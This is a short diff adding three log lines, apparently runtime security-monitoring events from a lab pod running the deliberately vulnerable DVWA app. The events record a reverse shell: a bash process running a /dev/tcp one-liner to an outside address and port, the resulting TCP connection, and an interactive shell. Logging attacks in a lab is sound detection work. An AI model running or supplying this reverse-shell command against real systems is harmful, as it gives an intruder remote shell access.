@@ -1,0 +1,3 @@
+🚀 process security-lab/dvwa-654b66c5f8-z8knn /bin/bash -c "bash -i >& /dev/tcp/192.168.1.183/4446 0>&1"
+🔌 connect security-lab/dvwa-654b66c5f8-z8knn /bin/bash tcp 10.0.0.163:56730 -> 192.168.1.183:4446
+🚀 process security-lab/dvwa-654b66c5f8-z8knn /bin/bash -i
